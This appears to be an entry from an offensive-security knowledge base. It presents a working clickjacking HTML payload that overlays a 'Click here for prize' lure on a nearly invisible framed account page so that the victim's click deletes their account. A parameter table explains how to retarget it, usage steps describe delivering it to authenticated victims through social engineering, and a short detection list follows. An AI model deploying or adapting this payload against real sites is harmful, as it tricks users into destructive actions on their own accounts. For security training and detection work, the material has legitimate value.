---
type: code
language: html
verified: true
created_at: '2020-08-05T19:10:56.231890+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - clickjacking
  - payload
  - html
validated: true
---

# Clickjacking-HTML-Overlay-for-Account-Deletion

## Code

```html
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:380px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click here for prize</div>
<iframe src="https://ace51f641eb01e7580354b3e003b00ab.web-security-academy.net/account"></iframe>
```

## Description

This HTML code creates a malicious webpage for a clickjacking attack. It embeds the target's account page in a semi-transparent iframe (opacity 0.1) and overlays a visible div labeled "Click here for prize" positioned to align exactly with the hidden delete account button. When the victim clicks the div, it triggers the underlying button in the iframe, submitting the delete form. The code preserves the legitimate CSRF token context, bypassing token-based protections.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| iframe src URL | The full URL of the target's account page (replace the hardcoded value) | https://target.com/account |
| div top offset | Vertical position in pixels to align the lure with the delete button (adjust based on target inspection) | 380px |
| div left offset | Horizontal position in pixels for alignment | 60px |
| iframe width/height | Dimensions to fit the target's page content | 500px / 700px |
| opacity | Transparency level for the iframe (0.1 makes it nearly invisible) | 0.1 |

## Usage

Save this code as an HTML file (e.g., prize.html) and host it on a web server accessible via HTTP/HTTPS. Deliver the URL to the victim via social engineering while they are authenticated to the target site. Test alignment by loading the page in a browser logged into the target and using dev tools to verify the div overlaps the delete button precisely. This payload is used in procedures like [[procedures/Clickjacking-to-Bypass-CSRF-and-Delete-Account]] for account takeover or disruption scenarios.

## Detection

- Browser dev tools or network logs showing unexpected iframe loads from untrusted domains.
- CSP violations if frame-ancestors is configured.
- User reports of accidental clicks or phishing suspicions.
- Server-side logs of anomalous form submissions (e.g., delete actions without direct navigation).
- JavaScript frame-busting detection scripts alerting on embedding.

## Related

- [[procedures/Clickjacking-to-Bypass-CSRF-and-Delete-Account]]
